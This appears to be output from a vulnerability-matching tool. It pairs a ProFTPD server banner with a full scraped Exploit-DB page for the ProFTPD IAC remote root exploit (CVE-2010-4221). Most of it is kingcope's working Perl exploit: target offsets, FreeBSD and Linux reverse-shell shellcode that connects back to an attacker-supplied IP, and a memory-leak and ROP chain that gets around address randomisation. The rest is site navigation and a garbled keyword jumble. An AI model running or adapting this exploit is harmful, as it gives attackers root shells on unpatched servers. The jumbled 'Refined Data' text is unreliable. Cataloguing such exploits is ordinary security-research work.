+  "products": [
+    "sh4",
+    "crisv32",
+    "x86",
+    "x86",
+    "plan9",
+    "x86",
+    "x86",
+    "tru64",
+    "x86",
+    "x86",
+    "x86",
+    "x86",
+    "pwn2own",
+    "x86"
+  ]
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Local Dependencies: 
+[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Raw Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.exploit-db.com/exploits/15449===============================
+
+ProFTPd IAC 1.3.x - Remote Command Execution
+Exploit Database
+Exploits
+GHDB
+Papers
+Shellcodes
+Search EDB
+SearchSploit Manual
+Submissions
+Online Training
+PWK
+Penetration Testing with Kali
+AWAE
+Advanced Web Attacks
+WiFu
+Wireless Attacks
+Offsec Resources
+Stats
+About Us
+About Exploit-DB
+Exploit-DB History
+FAQ
+Search
+GET CERTIFIED
+ProFTPd IAC 1.3.x - Remote Command Execution
+EDB-ID:
+15449
+CVE:
+2010-4221
+EDB Verified:
+Author:
+kingcope
+Type:
+remote
+Exploit:
+/
+Platform:
+Linux
+Date:
+2010-11-07
+Vulnerable App:
+Become a Certified Penetration Tester
+Enroll in
+Penetration Testing with Kali Linux
+, the course
+required to become an
+Offensive Security Certified Professional (OSCP)
+GET CERTIFIED
+# Exploit Title: ProFTPD IAC Remote Root Exploit
+# Date: 7 November 2010
+# Author: Kingcope
+#
+# E-DB Note: If you have issues with this exploit, alter lines 549, 555 and 563.
+use IO::Socket;
+$numtargets = 13;
+@targets =
+(
+# Plain Stack Smashing
+#Confirmed to work
+["FreeBSD 8.1 i386, ProFTPD 1.3.3a Server (binary)",# PLATFORM SPEC
+"FreeBSD",	# OPERATING SYSTEM
+0,			# EXPLOIT STYLE
+0xbfbfe000,	# OFFSET START
+0xbfbfff00,	# OFFSET END
+1029],		# ALIGN
+#Confirmed	to work
+["FreeBSD 8.0/7.3/7.2 i386, ProFTPD 1.3.2a/e/c Server (binary)",
+"FreeBSD",
+0,
+0xbfbfe000,
+0xbfbfff00,
+1021],
+# Return into Libc
+#Confirmed to work
+["Debian GNU/Linux 5.0, ProFTPD 1.3.2e Server (Plesk binary)",
+"Linux",
+1,			# EXPLOIT STYLE
+0x0804CCD4,	# write(2) offset
+8189,		# ALIGN
+0], 		# PADDING
+# Confirmed to work
+["Debian GNU/Linux 5.0, ProFTPD 1.3.3 Server (Plesk binary)",
+"Linux",
+1,
+0x0804D23C,
+4101,
+0],
+#Confirmed to work
+["Debian GNU/Linux 4.0, ProFTPD 1.3.2e Server (Plesk binary)",
+"Linux",
+1,
+0x0804C9A4,
+8189,
+0],
+#Confirmed to work
+["Debian Linux Squeeze/sid, ProFTPD 1.3.3a Server (distro binary)",
+"Linux",
+1,
+0x080532D8,
+4101,
+12],
+["SUSE Linux 9.3, ProFTPD 1.3.2e Server (Plesk binary)",
+"Linux",
+1,
+0x0804C9C4,
+8189,
+0],
+["SUSE Linux 10.0/10.3, ProFTPD 1.3.2e Server (Plesk binary)",
+"Linux",
+1,
+0x0804CAA8,
+8189,
+0],
+["SUSE Linux 10.2, ProFTPD 1.3.2e Server (Plesk binary)",
+"Linux",
+1,
+0x0804CBBC,
+8189,
+0],
+["SUSE Linux 11.0, ProFTPD 1.3.2e Server (Plesk binary)",
+"Linux",
+1,
+0x0804CCBC,
+8189,
+0],
+#Confirmed to work
+["SUSE Linux 11.1, ProFTPD 1.3.2e Server (Plesk binary)",
+"Linux",
+1,
+0x0804CCE0,
+8189,
+0],
+["SUSE Linux SLES 10, ProFTPD 1.3.2e Server (Plesk binary)",
+"Linux",
+1,
+0x0804CA2C,
+8189,
+0],
+#Confirmed to work
+["CentOS 5, ProFTPD 1.3.2e Server (Plesk binary)",
+"Linux",
+1,
+0x0804C290,
+8189,
+0],
+# feel free to add more targets.
+);
+#freebsd reverse shell port 45295
+#setup a netcat on this port ^^
+$bsdcbsc =
+# setreuid
+"\x31\xc0\x31\xc0\x50\x31\xc0\x50\xb0\x7e\x50\xcd\x80".
+# connect back :>
+"\x31\xc0\x31\xdb\x53\xb3\x06\x53".
+"\xb3\x01\x53\xb3\x02\x53\x54\xb0".
+"\x61\xcd\x80\x31\xd2\x52\x52\x68".
+"\x41\x41\x41\x41\x66\x68\xb0\xef".
+"\xb7\x02\x66\x53\x89\xe1\xb2\x10".
+"\x52\x51\x50\x52\x89\xc2\x31\xc0".
+"\xb0\x62\xcd\x80\x31\xdb\x39\xc3".
+"\x74\x06\x31\xc0\xb0\x01\xcd\x80".
+"\x31\xc0\x50\x52\x50\xb0\x5a\xcd".
+"\x80\x31\xc0\x31\xdb\x43\x53\x52".
+"\x50\xb0\x5a\xcd\x80\x31\xc0\x43".
+"\x53\x52\x50\xb0\x5a\xcd\x80\x31".
+"\xc0\x50\x68\x2f\x2f\x73\x68\x68".
+"\x2f\x62\x69\x6e\x89\xe3\x50\x54".
+"\x53\x50\xb0\x3b\xcd\x80\x31\xc0".
+"\xb0\x01\xcd\x80";
+#linux reverse shell port 45295 by bighawk
+#setup a netcat on this port ^^
+$lnxcbsc =
+# setreuid
+"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x90\x90\x90".
+# connect back :>
+"\x6a\x66".
+"\x58".
+"\x6a\x01".
+"\x5b".
+"\x31\xc9".
+"\x51".
+"\x6a\x01".
+"\x6a\x02".
+"\x89\xe1".
+"\xcd\x80".
+"\x68\x7f\x7f\x7f\x7f". # IP
+"\x66\x68\xb0\xef". # PORT
+"\x66\x6a\x02".
+"\x89\xe1".
+"\x6a\x10".
+"\x51".
+"\x50".
+"\x89\xe1".
+"\x89\xc6".
+"\x6a\x03".
+"\x5b".
+"\x6a\x66".
+"\x58".
+"\xcd\x80".
+"\x87\xf3".
+"\x6a\x02".
+"\x59".
+"\xb0\x3f".
+"\xcd\x80".
+"\x49".
+"\x79\xf9".
+"\xb0\x0b".
+"\x31\xd2".
+"\x52".
+"\x68\x2f\x2f\x73\x68".
+"\x68\x2f\x62\x69\x6e".
+"\x89\xe3".
+"\x52".
+"\x53".
+"\x89\xe1".
+"\xcd\x80";
+sub exploit1 {
+for ($counter=$targets[$ttype][3]; $counter < $targets[$ttype][4]; $counter += 250) {
+printf("[$target] CURRENT OFFSET = %08x :pP\n", $counter);
+$ret = pack("V", $counter);
+$align = $targets[$ttype][5];
+my $sock = IO::Socket::INET->new(PeerAddr => $target,
+PeerPort => 21,
+Proto
+=> 'tcp');
+$stack = "KCOPERULEZKCOPERULEZKC" . $ret . "\x90" x 500 . $shellcode . "A" x 10;
+$v = <$sock>;
+print $sock "\x00" x $align . "\xff" . $stack . "\n";
+close($sock);
+}
+}
+# Linux technique to retrieve a rootshell (C) kingcope 2010
+#
+# uses write(2) to fetch process memory out of the remote box (you can find the offset using IDA)
+# only the write(2) plt entry offset is needed for the exploit to work (and of course the
+# align value)
+# once the correct write value is given to the exploit it fetches the memory space of proftpd.
+# with this information the exploit can find function entries and byte values
+# relative to the write(2) address.
+# once the memory is read out the exploit does the following to circumvent linux adress space
+# randomization:
+#
+# 1.) calculate mmap64() plt entry
+# 2.) seek for assembly instructions in the proftpd memory space relative to write(2)
+#
+such as pop pop ret instructions
+# 3.) call mmap64() to map at address 0x10000000 with protection read,write,execute
+# 4.) calculate offset for memcpy() which is later used to construct the shellcode copy routine
+# 4.) copy known assembly instructions (which have been found before using the memory read)
+#
+to address 0x10000000. these instructions will copy the shellcode from ESP to 0x10000100
+#
+and make use of the memcpy found before
+# 5.) actually jump to the shellcode finder
+# 6.) once the shellcode has been copied to 0x10000100 jump to it
+# 7.) shellcode gets executed and we have our desired root shell.
+sub exploit2 {
+printf("[$target] %s :pP\n", $targets[$ttype][0]);
+$align = $targets[$ttype][4];
+$write_offset = $targets[$ttype][3];
+$padding = $targets[$ttype][5];
+$|=1;
+print "align = $align\n";
+print "Seeking for write(2)..\n";
+#known good write(2) values
+#0x0804C290
+#0x0804A85C
+#0x0804A234
+#0x08052830
+#080532D8 proftpd-basic_1.3.3a-4_i386
+#08052938 proftpd-basic_1.3.2e-4_i386 (ubunutu)
+#0804CCD4 psa-proftpd_1.3.2e-debian5.0.build95100504.17_i386 !!
+printf "Using write offset %08x.\n", $write_offset;
+$k = $write_offset;
+$sock = IO::Socket::INET->new(PeerAddr => $target,
+PeerPort => 21,
+Proto
+=> 'tcp');
+$sock->sockopt(SO_LINGER, pack("ii", 1, 0));
+#$x = <stdin>;
+$stack = "KCOPERULEZKCOPERULEZKC". "C" x $padding .
+pack("V", $k).
+# write
+"\xcc\xcc\xcc\xcc".
+"\x01\x00\x00\x00".	# fd for write
+pack("V", $k). # buffer for write
+"\xff\xff\x00\x00";	# length for write
+$v = <$sock>;
+print $sock "\x00" x $align . "\xff" . $stack . "\n";
+vec ($rfd, fileno($sock), 1) = 1;
+$timeout = 2;
+if (select ($rfd, undef, undef, $timeout) >= 0
+&& vec($rfd, fileno($sock), 1))
+{
+if (read($sock, $buff, 0xffff) == 0xffff) {
+printf "\nSUCCESS. write(2) is at %08x\n", $k;
+close($sock);
+goto lbl1;
+}
+}
+close($sock);
+printf "wrong write(2) offset.\n";
+exit;
+lbl1:
+#	Once we're here chances are good that we get the root shell
+print "Reading memory from server...\n";
+my $sock = IO::Socket::INET->new(PeerAddr => $target,
+PeerPort => 21,
+Proto
+=> 'tcp');
+$stack = "KCOPERULEZKCOPERULEZKC" . "C" x $padding .
+pack("V", $k).
+# write
+"\xcc\xcc\xcc\xcc".
+"\x01\x00\x00\x00".	# fd for write
+pack("V", $k). # buffer for write
+"\xff\xff\x0f\x00";	# length for write
+$v = <$sock>;
+print $sock "\x00" x $align . "\xff" . $stack . "\n";
+read($sock, $buff, 0xfffff);
+if (($v = index $buff, "\x5E\x5F\x5D") >= 0) {
+$pop3ret = $k + $v;
+printf "pop pop pop ret located at %08x\n", $pop3ret;
+} else {
+print "Could not find pop pop pop ret\n";
+exit;
+}
+if (($v = index $buff, "\x83\xC4\x20\x5B\x5E\x5D\xC3") >= 0) {
+$largepopret = $k + $v;
+printf "large pop ret located at %08x\n", $largepopret;
+} else {
+print "Could not find pop pop pop ret\n";
+exit;
+}
+if (($v = index $buff, "\xC7\x44\x24\x08\x03\x00\x00\x00\xC7\x04\x24\x00\x00\x00\x00\x89\x44\x24\x04") >= 0) {
+$addr1 = $k+$v+23;
+$mmap64 = unpack("I", substr($buff, $v+20, 4));
+$mmap64 = $addr1 - (0xffffffff-$mmap64);
+printf "mmap64 is located at %08x\n", $mmap64;
+} else {
+if (($v = index $buff, "\x89\x44\x24\x10\xA1\xBC\xA5\x0F\x08\x89\x44\x24\x04\xe8") >= 0) {
+$addr1 = $k+$v+17;
+$mmap64 = unpack("I", substr($buff, $v+14, 4));
+$mmap64 = $addr1 - (0xffffffff-$mmap64);
+printf "mmap64 is located at %08x\n", $mmap64;
+} else {
+print "Could not find mmap64()\n";
+exit;
+}
+}
+if (($v = index $buff, "\x8D\x45\xF4\x89\x04\x24\x89\x54\x24\x08\x8B\x55\x08\x89\x54\x24\x04\xE8") >= 0) {
+$addr1 = $k+$v+21;
+$memcpy = unpack("I", substr($buff, $v+18, 4));
+$memcpy = $addr1 - (0xffffffff-$memcpy);
+printf "memcpy is located at %08x\n", $memcpy;
+} else {
+if (($v = index $buff, "\x8B\x56\x10\x89\x44\x24\x08\x89\x54\x24\x04\x8B\x45\xE4\x89\x04\x24\xe8") >= 0) {
+$addr1 = $k+$v+21;
+$memcpy = unpack("I", substr($buff, $v+18, 4));
+$memcpy = $addr1 - (0xffffffff-$memcpy);
+printf "memcpy is located at %08x\n", $memcpy;
+} else {
+if (($v = index $buff, "\x89\x44\x24\x04\xA1\xBC\x9F\x0E\x08\x89\x04\x24") >= 0) {
+$addr1 = $k+$v+16;
+$memcpy = unpack("I", substr($buff, $v+13, 4));
+$memcpy = $addr1 - (0xffffffff-$memcpy);
+printf "memcpy is located at %08x\n", $memcpy;
+} else {
+if (($v = index $buff, "\x89\x7C\x24\x04\x89\x1C\x24\x89\x44\x24\x08") >= 0) {
+$addr1 = $k+$v+15;
+$memcpy = unpack("I", substr($buff, $v+12, 4));
+$memcpy = $addr1 - (0xffffffff-$memcpy);
+printf "memcpy is located at %08x\n", $memcpy;
+}	 else {
+if (($v = index $buff, "\x8B\x55\x10\x89\x74\x24\x04\x89\x04\x24\x89\x54\x24\x08") >= 0) {
+$addr1 = $k+$v+18;
+$memcpy = unpack("I", substr($buff, $v+15, 4));
+$memcpy = $addr1 - (0xffffffff-$memcpy);
+printf "memcpy is located at %08x\n", $memcpy;
+} else {
+print "Could not find memcpy()\n";
+exit;
+}
+}
+}
+}
+}
+if (($v = index $buff, "\xfc\x8b") >= 0) {
+$byte1 = $k+$v;
+printf ("byte1: %08x\n", $byte1);
+} else {
+print "Could not find a special byte\n";
+exit;
+}
+if (($v = index $buff, "\xf4") >= 0) {
+$byte2 = $k+$v;
+printf ("byte2: %08x\n", $byte2);
+} else {
+print "Could not find a special byte\n";
+exit;
+}
+if (($v = index $buff, "\xbf") >= 0) {
+$byte3 = $k+$v;
+printf ("byte3: %08x\n", $byte3);
+} else {
+print "Could not find a special byte\n";
+exit;
+}
+if (($v = index $buff, "\x00\x01\x00") >= 0) {
+$byte4 = $k+$v;
+printf ("byte4: %08x\n", $byte4);
+} else {
+print "Could not find a special byte\n";
+exit;
+}
+if (($v = index $buff, "\x10") >= 0) {
+$byte5 = $k+$v;
+printf ("byte5: %08x\n", $byte5);
+} else {
+print "Could not find a special byte\n";
+exit;
+}
+if (($v = index $buff, "\xB9\x00\x02\x00\x00") >= 0) {
+$byte6 = $k+$v;
+printf ("byte6: %08x\n", $byte6);
+} else {
+print "Could not find a special byte\n";
+exit;
+}
+if (($v = index $buff, "\xf3") >= 0) {
+$byte7 = $k+$v;
+printf ("byte7: %08x\n", $byte7);
+} else {
+print "Could not find a special byte\n";
+exit;
+}
+if (($v = index $buff, "\xA4") >= 0) {
+$byte8 = $k+$v;
+printf ("byte8: %08x\n", $byte8);
+} else {
+print "Could not find a special byte\n";
+exit;
+}
+if (($v = index $buff, "\xeb\xff") >= 0) {
+$byte9 = $k+$v;
+printf ("byte9: %08x\n", $byte9);
+} else {
+print "Could not find a special byte\n";
+exit;
+}
+# shellcode copy routine:
+#0100740B
+FC
+CLD
+#0100740C
+8BF4
+MOV ESI,ESP
+#0100740E
+BF 00010010
+MOV EDI,10000100
+#01007413
+B9 00020000
+MOV ECX,200
+#01007418
+F3:A4
+REP MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[>
+#
+EB FF 		 JMP +0xFF
+# FC 8B
+# F4 BF
+# 00 01 00
+# 10
+# B9 00 02 00 00
+# F3:A4
+# EB FF
+# El1Te X-Ploit TechNiqUe (C)
+print "Building exploit buffer\n";
+$stack = "KCOPERULEZKCOPERULEZKC" . "C" x $padding .
+pack("V", $mmap64). # mmap64()
+pack("V", $largepopret). # add
+esp, 20h; pop; pop
+"\x00\x00\x00\x10". # mmap start
+"\x00\x10\x00\x00". # mmap size
+"\x07\x00\x00\x00". # mmap prot
+"\x32\x00\x00\x00". # mmap flags
+"\xff\xff\xff\xff". # mmap fd
+"\x00\x00\x00\x00". # mmap offset
+"\x00\x00\x00\x00". # mmap offset
+"\x00\x00\x00\x00".
+"\x00\x00\x00\x00".
+"\x00\x00\x00\x00".
+"\x00\x00\x00\x00".
+pack("V", $memcpy). # memcpy()
+pack("V", $pop3ret). # pop; pop; pop; retn
+"\x00\x00\x00\x10". # destination
+pack("V", $byte1). # origin
+"\x02\x00\x00\x00". # number of bytes to copy
+pack("V", $memcpy). # memcpy()
+pack("V", $pop3ret). # pop; pop; pop; retn
+"\x02\x00\x00\x10". # destination
+pack("V", $byte2). # origin
+"\x01\x00\x00\x00". # number of bytes to copy
+pack("V", $memcpy). # memcpy()
+pack("V", $pop3ret). # pop; pop; pop; retn
+"\x03\x00\x00\x10". # destination
+pack("V", $byte3). # origin
+"\x01\x00\x00\x00". # number of bytes to copy
+pack("V", $memcpy). # memcpy()
+pack("V", $pop3ret). # pop; pop; pop; retn
+"\x04\x00\x00\x10". # destination
+pack("V", $byte4). # origin
+"\x03\x00\x00\x00". # number of bytes to copy
+pack("V", $memcpy). # memcpy()
+pack("V", $pop3ret). # pop; pop; pop; retn
+"\x07\x00\x00\x10". # destination
+pack("V", $byte5). # origin
+"\x01\x00\x00\x00". # number of bytes to copy
+pack("V", $memcpy). # memcpy()
+pack("V", $pop3ret). # pop; pop; pop; retn
+"\x08\x00\x00\x10". # destination
+pack("V", $byte6). # origin
+"\x05\x00\x00\x00". # number of bytes to copy
+pack("V", $memcpy). # memcpy()
+pack("V", $pop3ret). # pop; pop; pop; retn
+"\x0d\x00\x00\x10". # destination
+pack("V", $byte7). # origin
+"\x01\x00\x00\x00". # number of bytes to copy
+pack("V", $memcpy). # memcpy()
+pack("V", $pop3ret). # pop; pop; pop; retn
+"\x0e\x00\x00\x10". # destination
+pack("V", $byte8). # origin
+"\x01\x00\x00\x00". # number of bytes to copy
+pack("V", $memcpy). # memcpy()
+pack("V", $pop3ret). # pop; pop; pop; retn
+"\x0f\x00\x00\x10". # destination
+pack("V", $byte9). # origin
+"\x02\x00\x00\x00". # number of bytes to copy
+"\x00\x00\x00\x10". # JUMP TO 0x10000000 rwxp address
+"\x90" x 100 . $shellcode . "\x90" x 10;
+print "Sending exploit buffer!\n";
+my $sock = IO::Socket::INET->new(PeerAddr => $target,
+PeerPort => 21,
+Proto
+=> 'tcp');
+$v = <$sock>;
+print $sock "\x00" x $align . "\xff" . $stack . "\n";
+print "Check your netcat?\n";
+while(<$sock>) {
+print;
+}
+}
+sub usage() {
+print "written by kingcope\n";
+print "usage:\n".
+"proremote.pl <target ip/host> <your ip> <target type>\n\n";
+for ($i=0; $i<$numtargets; $i++) {
+print "\t[".$i."]\t". $targets[$i][0]. "\r\n";
+}
+exit;
+}
+if ($#ARGV ne 2) { usage; }
+$target = $ARGV[0];
+$cbip = $ARGV[1];
+$ttype = $ARGV[2];
+$platform = $targets[$ttype][1];
+$style = $targets[$ttype][2];
+($a1, $a2, $a3, $a4) = split(//, gethostbyname("$cbip"));
+if ($platform eq "FreeBSD") {
+$shellcode = $bsdcbsc;
+substr($shellcode, 37, 4, $a1 . $a2 . $a3 . $a4);
+} else {
+if ($platform eq "Linux") {
+$shellcode = $lnxcbsc;
+substr($shellcode, 31, 4, $a1 . $a2 . $a3 . $a4);
+} else {
+print "typo ?\n";
+exit;
+}}
+if ($style eq 0) {
+exploit1;
+} else {
+exploit2;
+}
+print "done.\n";
+exit;
+Tags:
+Advisory/Source:
+Link
+Downloads
+Certifications
+Training
+Professional Services
+Kali Linux
+OSCP
+Penetration Testing with Kali Linux (PWK)
+Penetration Testing
+Kali NetHunter
+OSWP
+Advanced Web Attacks and Exploitation (AWAE)
+Advanced Attack Simulation
+Kali Linux Revealed Book
+OSCE
+Offensive Security Wireless Attacks (WiFu)
+Application Security Assessment
+OSEE
+Cracking the Perimeter (CTP)
+OSWE
+Metasploit Unleashed (MSFU)
+KLCP
+Free Kali Linux Training
+Downloads
+Kali Linux
+Kali NetHunter
+Kali Linux Revealed Book
+Certifications
+OSCP
+OSWP
+OSCE
+OSEE
+OSWE
+KLCP
+Training
+Penetration Testing with Kali Linux (PWK)
+Advanced Web Attacks and Exploitation (AWAE)
+Offensive Security Wireless Attacks (WiFu)
+Cracking the Perimeter (CTP)
+Metasploit Unleashed (MSFU)
+Free Kali Linux training
+Pro Services
+Penetration Testing
+Advanced Attack Simulation
+Application Security Assessment
+Exploit Database by Offensive Security
+Terms
+Privacy
+About Us
+FAQ
+©
+Copyright 2019, Exploit Database
+About The Exploit Database
+×
+The Exploit Database is maintained by Offensive Security, an information security training company
+that provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is a
+non-profit project that is provided as a public service by Offensive Security.
+The Exploit Database is a CVE
+compliant archive of public exploits and corresponding vulnerable software,
+developed for use by penetration testers and vulnerability researchers. Our aim is to serve
+the most comprehensive collection of exploits gathered through direct submissions, mailing
+lists, as well as other public sources, and present them in a freely-available and
+easy-to-navigate database. The Exploit Database is a repository for exploits and
+proof-of-concepts rather than advisories, making it a valuable resource for those who need
+actionable data right away.
+The Google Hacking Database (GHDB)
+is a categorized index of Internet search engine queries designed to uncover interesting,
+and usually sensitive, information made publicly available on the Internet. In most cases,
+this information was never meant to be made public but due to any number of factors this
+information was linked in a web document that was crawled by a search engine that
+subsequently followed that link and indexed the sensitive information.
+The process known as “Google Hacking” was popularized in 2000 by Johnny
+Long, a professional hacker, who began cataloging these queries in a database known as the
+Google Hacking Database. His initial efforts were amplified by countless hours of community
+member effort, documented in the book Google Hacking For Penetration Testers and popularised
+by a barrage of media attention and Johnny’s talks on the subject such as this early talk
+recorded at DEFCON 13. Johnny coined the term “Googledork” to refer
+to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
+the fact that this was not a “Google problem” but rather the result of an often
+unintentional misconfiguration on the part of a user or a program installed by the user.
+Over time, the term “dork” became shorthand for a search query that located sensitive
+information and “dorks” were included with may web application vulnerability releases to
+show examples of vulnerable web sites.
+After nearly a decade of hard work by the community, Johnny turned the GHDB
+over to Offensive Security in November 2010, and it is now maintained as
+an extension of the Exploit Database. Today, the GHDB includes searches for
+other online search engines such as Bing,
+and other online repositories like GitHub,
+producing different, yet equally valuable results.
+Close
+Offensive Security Resources
+×
+Downloads
+Certifications
+Training
+Services
+Kali Linux
+OSCP
+Penetration Testing with Kali Linux (PWK)
+Penetration Testing
+Kali NetHunter
+OSWP
+Offensive Security Wireless Attacks (WiFu)
+Advanced Attack Simulation
+Kali Linux Revealed Book
+OSCE
+Cracking the Perimeter (CTP)
+Application Security Assessment
+OSEE
+Advanced Web Attacks (AWAE)
+OSWE
+Metasploit Unleashed (MSFU)
+KLCP
+Free Kali Linux training
+Close
+Search The Exploit Database
+×
+Title
+CVE
+Type
+dos
+local
+remote
+shellcode
+papers
+webapps
+Platform
+AIX
+ASP
+BSD
+BSD_PPC
+BSD_x86
+BSDi_x86
+CGI
+FreeBSD
+FreeBSD_x86
+FreeBSD_x86-64
+Generator
+Hardware
+HP-UX
+IRIX
+JSP
+Linux
+Linux_MIPS
+Linux_PPC
+Linux_SPARC
+Linux_x86
+Linux_x86-64
+MINIX
+Multiple
+NetBSD_x86
+Novell
+OpenBSD
+OpenBSD_x86
+OSX_PPC
+OSX
+PHP
+Plan9
+QNX
+SCO
+SCO_x86
+Solaris
+Solaris_SPARC
+Solaris_x86
+Tru64
+ULTRIX
+Unix
+UnixWare
+Windows_x86
+Windows_x86-64
+Windows
+ARM
+CFM
+Netware
+SuperH_SH4
+Java
+BeOS
+Immunix
+Palm_OS
+AtheOS
+iOS
+Android
+XML
+Perl
+Python
+System_z
+JSON
+ASHX
+Ruby
+ASPX
+macOS
+Linux_CRISv32
+eZine
+Magazine
+NodeJS
+Alpha
+Solaris_MIPS
+Lua
+Author
+Content
+Port
+14
+21
+22
+23
+25
+42
+49
+53
+66
+69
+70
+79
+80
+81
+102
+105
+110
+111
+113
+119
+123
+135
+139
+143
+161
+162
+164
+383
+389
+402
+406
+411
+443
+444
+445
+446
+502
+504
+513
+514
+515
+532
+548
+554
+555
+617
+623
+631
+655
+689
+783
+787
+808
+873
+888
+901
+998
+1000
+1040
+1089
+1099
+1100
+1114
+1120
+1194
+1235
+1471
+1521
+1533
+1581
+1589
+1604
+1617
+1723
+1743
+1761
+1812
+1858
+1861
+1900
+1947
+2000
+2022
+2049
+2100
+2103
+2121
+2125
+2181
+2242
+2315
+2375
+2380
+2381
+2401
+2480
+2525
+2640
+2810
+2812
+2947
+2954
+2990
+3000
+3030
+3050
+3052
+3128
+3129
+3181
+3200
+3217
+3306
+3333
+3378
+3460
+3465
+3500
+3535
+3632
+3690
+3790
+3814
+3817
+4000
+4002
+4070
+4081
+4105
+4111
+4322
+4343
+4434
+4501
+4555
+4592
+4661
+4750
+4848
+5000
+5060
+5061
+5080
+5081
+5093
+5151
+5180
+5247
+5250
+5272
+5308
+5432
+5466
+5554
+5555
+5600
+5655
+5666
+5800
+5803
+5814
+5858
+5900
+5984
+6066
+6070
+6080
+6082
+6101
+6112
+6129
+6502
+6503
+6660
+6667
+7001
+7002
+7070
+7071
+7080
+7100
+7144
+7210
+7272
+7290
+7426
+7443
+7510
+7547
+7649
+7770
+7777
+7778
+7787
+7879
+7902
+8000
+8001
+8002
+8004
+8008
+8020
+8022
+8023
+8028
+8030
+8080
+8081
+8082
+8088
+8090
+8181
+8300
+8400
+8443
+8445
+8473
+8500
+8585
+8619
+8800
+8812
+8839
+8880
+8888
+9000
+9001
+9002
+9080
+9090
+9091
+9100
+9124
+9200
+9251
+9256
+9443
+9447
+9784
+9788
+9855
+9876
+9900
+9987
+9993
+9999
+10000
+10001
+10080
+10202
+10203
+10443
+10616
+11000
+11211
+11460
+12203
+12221
+12345
+12397
+12401
+13327
+13701
+13722
+13838
+16992
+18821
+18881
+19000
+19810
+19813
+20000
+20010
+20031
+20111
+20171
+22003
+23423
+25672
+26000
+27015
+27700
+28015
+30000
+30303
+31337
+32400
+32674
+32764
+34205
+37215
+37777
+37848
+38292
+40007
+41523
+44334
+46824
+48080
+49152
+50000
+50496
+52311
+52789
+52869
+52986
+53413
+54345
+54890
+55554
+55555
+56380
+57772
+58080
+62514
+Tag
+WordPress Core
+Metasploit Framework (MSF)
+WordPress Plugin
+SQL Injection (SQLi)
+Cross-Site Scripting (XSS)
+File Inclusion (LFI/RFI)
+Cross-Site Request Forgery (CSRF)
+Denial of Service (DoS)
+Code Injection
+Command Injection
+Authentication Bypass / Credentials Bypass (AB/CB)
+Client Side
+Use After Free (UAF)
+Out Of Bounds
+Remote
+Local
+XML External Entity (XXE)
+Integer Overflow
+Server-Side Request Forgery (SSRF)
+Race Condition
+NULL Pointer Dereference
+Malware
+Buffer Overflow
+Heap Overflow
+Type Confusion
+Object Injection
+Bug Report
+Console
+Pwn2Own
+Traversal
+Deserialization
+Verified
+Has App
+No Metasploit
+Search
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Refined Data: 
+220 NASFTPD Turbo station 1.3.5a Server (ProFTPD)
+Refined:  220 nasftpd turbo station 1 5a server proftpd
+
+============================https://www.exploit-db.com/exploits/15449===============================
+
+ 64 windows arm cfm netware superh_sh4 java beos immunix palm_os atheos ios android xml perl python system_z json ashx ruby aspx macos linux_crisv32 ezine magazine nodejs alpha solaris_mips lua author content port 14 21 22 23 25 42 49 53 66 69 70 79 80 81 102 105 110 111 113 119 123 135 139 143 161 162 164 383 389 402 406 411 443 444 445 446 502 504 513 514 515 532 548 554 555 617 623 631 655 689 783 787 808 873 888 901 998 1000 1040 1089 1099 1100 1114 1120 1194 1235 1471 1521 1533 1581 1589 1604 1617 1723 1743 1761 1812 1858 1861 1900 1947 2000 2022 2049 2100 2103 2121 2125 2181 2242 2315 2375 2380 2381 2401 2480 2525 2640 2810 2812 2947 2954 2990 3000 3030 3050 3052 3128 3129 3181 3200 3217 3306 3333 3378 3460 3465 3500 3535 3632 3690 3790 3814 3817 4000 4002 4070 4081 4105 4111 4322 4343 4434 4501 4555 4592 4661 4750 4848 5000 5060 5061 5080 5081 5093 5151 5180 5247 5250 5272 5308 5432 5466 5554 5555 5600 5655 5666 5800 5803 5814 5858 5900 5984 6066 6070 6080 6082 6101 6112 6129 6502 6503 6660 6667 7001 7002 7070 7071 7080 7100 7144 7210 7272 7290 7426 7443 7510 7547 7649 7770 7777 7778 7787 7879 7902 8000 8001 8002 8004 8008 8020 8022 8023 8028 8030 8080 8081 8082 8088 8090 8181 8300 8400 8443 8445 8473 8500 8585 8619 8800 8812 8839 8880 8888 9000 9001 9002 9080 9090 9091 9100 9124 9200 9251 9256 9443 9447 9784 9788 9855 9876 9900 9987 9993 9999 10000 10001 10080 10202 10203 10443 10616 11000 11211 11460 12203 12221 12345 12397 12401 13327 13701 13722 13838 16992 18821 18881 19000 19810 19813 20000 20010 20031 20111 20171 22003 23423 25672 26000 27015 27700 28015 30000 30303 31337 32400 32674 32764 34205 37215 37777 37848 38292 40007 41523 44334 46824 48080 49152 50000 50496 52311 52789 52869 52986 53413 54345 54890 55554 55555 56380 57772 58080 62514 tag wordpress core metasploit framework 64 minix multiple netbsd_x86 novell openbsd openbsd_x86 osx_ppc osx php plan9 qnx sco sco_x86 solaris solaris_sparc solaris_x86 tru64 ultrix unix unixware windows_x86 windows_x86 race condition null pointer dereference malware buffer overflow heap overflow type confusion object injection bug report console pwn2own traversal deserialization verified exploit database × title cve type dos local remote shellcode papers webapps platform aix asp bsd bsd_ppc bsd_x86 bsdi_x86 cgi freebsd freebsd_x86 freebsd_x86 klcp free kali linux training downloads kali linux kali nethunter kali linux revealed book certifications oscp oswp osce osee oswe klcp training penetration testing bounds remote local xml external entity remote command execution exploit database exploits ghdb papers shellcodes search edb searchsploit manual submissions online training pwk penetration testing wordpress plugin sql injection author 555 23 2000 14 free kali linux training pro services penetration testing advanced attack simulation application security assessment exploit database close offensive security resources × downloads certifications training services kali linux oscp penetration testing a4 rep movs byte ptr es :[ edi ], byte ptr ds :[> 64 generator hardware hp advanced attack simulation kali linux revealed book osce offensive security wireless attacks link downloads certifications training professional services kali linux oscp penetration testing peerport => 21 21 oswe metasploit unleashed kali awae advanced web attacks wifu wireless attacks offsec resources stats advanced attack simulation kali linux revealed book osce cracking metasploit search linux reverse shell port 45295 penetration testing kali nethunter oswp offensive security wireless attacks freebsd reverse shell port 45295 metasploit unleashed penetration testing kali nethunter oswp advanced web attacks ux irix jsp linux linux_mips linux_ppc linux_sparc 